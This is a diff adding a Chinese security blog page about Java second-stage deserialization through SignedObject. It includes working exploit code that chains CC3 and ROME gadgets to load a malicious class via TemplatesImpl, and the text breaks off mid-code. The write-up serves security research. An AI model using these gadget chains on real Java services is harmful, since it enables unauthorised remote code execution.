@@ -1,0 +1,1069 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="Java安全 - 浅谈二次反序列化‍ 前言本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: Zjacky 原文链接为https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;13900 在打反序列化的时候会经常存在JNDI不出网的情况下，无论是ROME链的恶意类加载还是Hessian的拼接起来的链子，都会遇到不出网的情况，那么不出网的情况下，应该怎么打呢？ ‍ ‍ Sig">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全 - 浅谈二次反序列化">
+<meta property="og:url" content="https://zjackky.github.io/post/java-security-talking-for-secondary-desequentization-z1daqqv.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="Java安全 - 浅谈二次反序列化‍ 前言本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: Zjacky 原文链接为https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;13900 在打反序列化的时候会经常存在JNDI不出网的情况下，无论是ROME链的恶意类加载还是Hessian的拼接起来的链子，都会遇到不出网的情况，那么不出网的情况下，应该怎么打呢？ ‍ ‍ Sig">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124419.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124892.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124111.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124327.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124497.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124686.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124844.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124087.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124291.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124454.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124675.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124837.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124045.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124565.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124759.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124917.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125105.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125292.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125443.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125600.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125770.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125946.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125145.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125300.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125459.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125612.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125804.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125971.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125491.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125644.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125803.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125964.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125117.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125290.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125463.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125604.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125763.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125952.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125108.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125336.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125482.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125655.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125826.png">
+<meta property="article:published_time" content="2024-02-23T09:06:46.000Z">
+<meta property="article:modified_time" content="2024-02-29T03:24:52.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="Zjacky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124419.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java安全 - 浅谈二次反序列化 - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"$","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java安全 - 浅谈二次反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-23 17:06" pubdate>
+          2024年2月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java安全 - 浅谈二次反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java安全-浅谈二次反序列化"><a href="#Java安全-浅谈二次反序列化" class="headerlink" title="Java安全 - 浅谈二次反序列化"></a>Java安全 - 浅谈二次反序列化</h1><p>‍</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13900">https://xz.aliyun.com/t/13900</a></p>
+<p>在打反序列化的时候会经常存在JNDI不出网的情况下，无论是ROME链的恶意类加载还是Hessian的拼接起来的链子，都会遇到不出网的情况，那么不出网的情况下，应该怎么打呢？</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="SignedObject二次反序列化"><a href="#SignedObject二次反序列化" class="headerlink" title="SignedObject二次反序列化"></a>SignedObject二次反序列化</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>它是<code>java.security</code>​下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>​包含另一个<code>Serializable</code>​对象。</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>‍</p>
+<p>利用链</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">SignedObject#getObject()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">x.readObject()</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>发现getObject()方法中还进行了一次readObject()反序列化</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124419.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>反序列化的内容也是可控，去看下他的构造方法，将传入的对象进行序列化给b 并将字节数组存储到content中</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124892.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>一个小型demo来传入恶意对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>kpg.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>那么现在我先手动调用他的getObject()方法并且传入一个可以进行反序列化的对象(随便拉了个CC3就行)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, SignatureException, InvalidKeyException, NoSuchFieldException &#123;<br><br>        <span class="hljs-comment">//CC3</span><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br>        <span class="hljs-comment">//E:\Java_project\Serialization_Learing\target\classes\Calc.class</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>        cls.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br><br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        signedObject.getObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124111.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么既然做到了手动触发，那现在的任务就是进行getter方法的调用，那其实思路也很清晰，找能够调用getter方法的链,刚好也总结一下常见调用getter的方法有哪些吧</p>
+<p>‍</p>
+<h3 id="getter触发链分析"><a href="#getter触发链分析" class="headerlink" title="getter触发链分析"></a>getter触发链分析</h3><p>‍</p>
+<h4 id="Rome-HashCode"><a href="#Rome-HashCode" class="headerlink" title="Rome(HashCode)"></a>Rome(HashCode)</h4><p>‍</p>
+<p>利用链</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">hashmap#readObject()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">ObjectBean#hashcode()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">EqualsBean#javabeanHashCode()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">ToStringBean#toString()-&gt;SignedObject#getObject()</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sign_RomeToStringBean</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span 